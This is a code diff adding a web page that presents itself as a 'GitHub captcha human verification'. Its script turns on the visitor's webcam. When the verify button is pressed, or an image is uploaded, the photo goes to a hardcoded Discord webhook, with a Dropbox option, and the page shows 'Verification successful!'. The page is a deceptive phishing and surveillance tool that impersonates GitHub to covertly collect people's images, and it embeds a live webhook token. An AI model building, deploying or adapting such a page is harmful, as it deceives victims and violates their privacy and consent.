@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Github human verification</title>
+
+<!-- ✅ ADDED: external CSS (your version) -->
+<link rel="stylesheet" href="style.css">
+
+<style>
+body {
+  font-family: system-ui, sans-serif;
+  background: linear-gradient(135deg, #1f1c2c, #928dab, #1f1c2c); /* new gradient background */
+  color: white;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.container {
+  background: rgba(0,0,0,0.25); /* slightly lighter transparent background */
+  padding: 25px; /* bigger padding for modern look */
+  border-radius: 20px; /* more rounded corners */
+  text-align: center;
+  width: 340px;
+  backdrop-filter: blur(10px); /* glassy blur effect */
+}
+
+h1 {
+  margin-bottom: 15px;
+}
+
+video, img {
+  width: 100%;
+  border-radius: 14px; /* slightly more rounded */
+  margin-bottom: 12px;
+  border: 2px solid #fff;
+}
+
+.buttons {
+  display: flex;
+  gap: 12px; /* slightly more spacing */
+}
+
+button, label {
+  flex: 1;
+  padding: 12px;
+  border-radius: 14px;
+  border: none;
+  cursor: pointer;
+  font-weight: bold;
+  background: linear-gradient(135deg, #6a11cb, #2575fc); /* new gradient buttons */
+  color: white;
+  text-align: center;
+}
+
+button:hover, label:hover {
+  opacity: 0.85;
+}
+
+input[type="file"] {
+  display: none;
+}
+
+#status {
+  margin-top: 10px;
+  font-size: 14px;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <h1>GitHub captcha human verification</h1>
+
+  <video id="video" autoplay playsinline></video>
+  <img id="preview" style="display:none">
+
+  <div class="buttons">
+    <button id="takePhoto">📷 Verify if you are a human</button>
+    <label for="fileInput">📁 Upload human verification</label>
+    <input id="fileInput" type="file" accept="image/*">
+  </div>
+
+  <div id="status"></div>
+</div>
+
+<script>
+/* ================== CONFIG ================== */
+
+// Choose: "discord" or "dropbox"
+const UPLOAD_TARGET = "discord";
+
+// Discord
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456389874818093118/xbL0enNASzzDLUvcu20ymOb0L1TgLK3XIsfOMAyGYsb5fFWvAW3PLGgVlqfqqsiSaJXZ";
+
+// Dropbox
+const DROPBOX_ACCESS_TOKEN = "YOUR_DROPBOX_ACCESS_TOKEN";
+const DROPBOX_PATH = "/uploads/photo.png";
+
+/* ============================================ */
+
+const video = document.getElementById("video");
+const preview = document.getElementById("preview");
+const status = document.getElementById("status");
+const fileInput = document.getElementById("fileInput");
+
+// Start camera
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => video.srcObject = stream)
+  .catch(() => status.innerText = "Camera not available");
+
+// Take photo → auto send
+document.getElementById("takePhoto").onclick = () => {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+  const blob = dataURLtoBlob(canvas.toDataURL("image/png"));
+  showPreview(blob);
+  upload(blob);
+};
+
+// Upload from storage → auto send
+fileInput.onchange = () => {
+  const file = fileInput.files[0];
+  if (!file) return;
+  showPreview(file);
+  upload(file);
+};
+
+function showPreview(blob) {
+  preview.src = URL.createObjectURL(blob);
+  preview.style.display = "block";
+  video.style.display = "none";
+}
+
+// Upload handler
+function upload(blob) {
+  status.innerText = "Verifying...";
+
+  if (UPLOAD_TARGET === "discord") {
+    const fd = new FormData();
+    fd.append("file", blob, "image.png");
+    fd.append("content", "📸 New image");
+
+    fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      body: fd
+    })
+    .then(r => status.innerText = r.ok ? "Verification successful!" : "Discord upload failed")
+    .catch(() => status.innerText = "Verification Failed");
+  }
+
+  if (UPLOAD_TARGET === "dropbox") {
+    fetch("https://content.dropboxapi.com/2/files/upload", {
+      method: "POST",
+      headers: {
+        "Authorization": "Bearer " + DROPBOX_ACCESS_TOKEN,
+        "Dropbox-API-Arg": JSON.stringify({
+          path: DROPBOX_PATH,
+          mode: "add",
+          autorename: true
+        }),
+        "Content-Type": "application/octet-stream"
+      },
+      body: blob
+    })
+    .then(r => status.innerText = r.ok ? "Uploaded to Dropbox!" : "Dropbox upload failed")
+    .catch(() => status.innerText = "Upload error");
+  }
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(",");
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+</script>
+
+<!-- ✅ ADDED: external JS (your version) -->
+<script src="script.js" defer></script>
+
+</body>
+</html>
